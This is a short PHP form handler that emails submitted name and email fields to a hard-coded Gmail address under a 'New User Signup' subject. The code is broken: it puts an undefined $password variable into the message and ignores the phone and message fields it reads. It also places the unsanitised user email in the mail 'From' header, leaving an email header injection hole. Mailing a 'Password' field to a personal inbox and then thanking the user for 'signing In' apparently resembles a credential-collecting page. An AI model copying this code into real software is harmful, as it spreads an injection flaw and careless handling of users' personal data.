<?php

if(isset($_POST['Submit'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $Msg = $_POST['msg'];

    $to = 'shehryarmalik543@gmail.com';
    $subject = 'New User Signup';
    $message = "Name: $name\nEmail: $email\nPassword: $password";
    $headers = "From: $email";

    mail($to, $subject, $message, $headers);

    echo "Thank you for signing In!";
}
?>